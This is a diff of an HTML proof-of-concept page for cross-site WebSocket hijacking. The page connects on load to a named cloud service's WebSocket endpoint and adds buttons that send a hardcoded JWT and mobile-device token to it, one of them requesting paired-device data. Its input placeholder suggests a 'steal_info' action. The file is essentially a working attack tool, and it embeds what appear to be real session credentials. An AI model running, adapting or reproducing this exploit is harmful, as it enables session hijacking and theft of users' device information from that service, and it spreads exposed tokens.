@@ -4,14 +4,31 @@
     <title>CSWSH PoC - WebSocket Interactive</title>
     <style>
       body { font-family: monospace; padding: 20px; background: #f9f9f9; }
-      #log { white-space: pre-wrap; background: #eee; padding: 10px; border-radius: 5px; margin-top: 10px; max-height: 300px; overflow-y: scroll; }
-      input, button { padding: 5px 10px; font-size: 1em; margin: 5px 0; }
+      #log { white-space: pre-wrap; background: #eee; padding: 10px; border-radius: 5px; margin-top: 10px; max-height: 400px; overflow-y: scroll; }
+      input, button { padding: 5px 10px; font-size: 1em; margin: 5px 5px 5px 0; }
+      .quick-buttons { margin-bottom: 10px; }
     </style>
   </head>
   <body>
     <h2>💥 CSWSH PoC - WebSocket Interactive Page</h2>
 
     <p>Status: <span id="status">🔌 Connecting...</span></p>
+
+    <div class="quick-buttons">
+      <strong>Quick Requests:</strong><br/>
+      <button onclick='sendQuick(`{
+        \"type\":\"CONNECT\",
+        \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTY1ODM3MywiZXhwIjoxNzUyMjUwMzczfQ.iPMQ4XNhVJCPK1nrqczkftfHiu7Cg3s3yC-ihPQzSxJrVet8LKFF95DrFZFsHOXw1q-pVtjfPwTfCzAOg_EiminZiKuYY2a5iV_V8GZ1nQDhZ4n8hWbF4saLrQnLxRFopx_voUTSDFJfdbQNQCIftQPA2k8Mz2dFt2RzwOSfT5wc-gyCwoObFAd5a3F2rrJmH_tlfVp894_JX8QhySGooBHO-x_nGo6ZbIbG3eW1HVdfrlYff2x14m4-pUJOBm0HTp2KnaH_yvCX2j0bg1i5TOIScO8Oc9WfpU5ovGoHT74DHvr_ihDdygwy04ZvOruxcWfHKgcjzaTEOtMhNlbLMA\",
+        \"body\":\"{\\\"mobile_device\\\":{\\\"token\\\":\\\"a36b64e823aae029647d9779b96764fc90124ff58d5f2af6b5e2cdbd1edba67a\\\",\\\"type\\\":\\\"iOS\\\",\\\"os\\\":\\\"18.2.1\\\"}}\"
+      }`)'>CONNECT</button>
+
+      <button onclick='sendQuick(`{
+        \"jwt\":\"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MywidXNlcklkIjoiYmVmMTJlOWI0YTg0OGQwYTEzOTdhMWUxIiwiYmxlIjoiQjA4Qzc1QkIzOUE4IiwiYWdlVmVyaWZpZWQiOnRydWUsImlhdCI6MTc0OTY1ODM3MywiZXhwIjoxNzUyMjUwMzczfQ.iPMQ4XNhVJCPK1nrqczkftfHiu7Cg3s3yC-ihPQzSxJrVet8LKFF95DrFZFsHOXw1q-pVtjfPwTfCzAOg_EiminZiKuYY2a5iV_V8GZ1nQDhZ4n8hWbF4saLrQnLxRFopx_voUTSDFJfdbQNQCIftQPA2k8Mz2dFt2RzwOSfT5wc-gyCwoObFAd5a3F2rrJmH_tlfVp894_JX8QhySGooBHO-x_nGo6ZbIbG3eW1HVdfrlYff2x14m4-pUJOBm0HTp2KnaH_yvCX2j0bg1i5TOIScO8Oc9WfpU5ovGoHT74DHvr_ihDdygwy04ZvOruxcWfHKgcjzaTEOtMhNlbLMA\",
+        \"type\":\"REQUEST\",
+        \"createdAt\":1749658438999,
+        \"body\":\"{\\\"type\\\":42,\\\"data\\\":{\\\"pairedDevices\\\":[\\\"A2657489-F926-44D5-914C-C3984B788FF5\\\"]}}\" 
+      }`)'>REQUEST (pairedDevices)</button>
+    </div>
 
     <input type="text" id="msgInput" placeholder='Type message (e.g. {"action":"steal_info"})' style="width: 80%;" />
     <button onclick="sendMsg()">Send</button>
@@ -21,13 +38,38 @@
 
     <script>
       let ws;
-      const log = (msg) => {
-        const logDiv = document.getElementById("log");
-        logDiv.innerHTML += msg + "\n";
-        logDiv.scrollTop = logDiv.scrollHeight;
-      };
-
+      const logDiv = document.getElementById("log");
       const statusEl = document.getElementById("status");
+
+      function log(msg, isJson = false) {
+        const entry = document.createElement("div");
+        // Add Line with timestamp like --> ----------- Timestamp: 2023-10-01 12:00:00 -----------
+        const timestamp = new Date().toISOString().replace("T", " ").substring(0, 19);
+        entry.style.marginBottom = "5px";
+        const separator = document.createElement("div");
+        separator.style.margin = "10px 0";
+        separator.textContent = `----------- Timestamp: ${timestamp} -----------`;
+        logDiv.appendChild(separator);
+        logDiv.scrollTop = logDiv.scrollHeight;
+
+        if (isJson) {
+          try {
+            const json = JSON.parse(msg);
+            const pre = document.createElement("pre");
+            pre.textContent = JSON.stringify(json, null, 2);
+            entry.appendChild(pre);
+          } catch {
+            entry.textContent = msg;
+          }
+        } else {
+          entry.textContent = msg;
+        }
+
+        logDiv.appendChild(entry);
+        logDiv.scrollTop = logDiv.scrollHeight;
+ 
+
+      }
 
       function connect() {
         ws = new WebSocket("wss://web-sdk-dev.twi-cloud-services.com/connect");
@@ -39,10 +81,11 @@
 
         ws.onmessage = (e) => {
           log("[Server] → " + e.data);
+          log(e.data, true);
         };
 
         ws.onerror = (e) => {
-          log("[!] Error: " + JSON.stringify(e));
+          log("[!] WebSocket Error: " + JSON.stringify(e));
         };
 
         ws.onclose = () => {
@@ -61,16 +104,25 @@
         }
       }
 
+      function sendQuick(payload) {
+        if (ws.readyState === WebSocket.OPEN) {
+          ws.send(payload);
+          log("[Quick] → " + payload);
+          log(payload, true);
+        } else {
+          log("[!] WebSocket not connected.");
+        }
+      }
+
       function reconnect() {
         log("[~] Reconnecting...");
         statusEl.textContent = "🔄 Reconnecting...";
         try {
           ws.close();
-        } catch (e) {}
+        } catch {}
         connect();
       }
 
-      // Connect on page load
       connect();
     </script>
   </body>
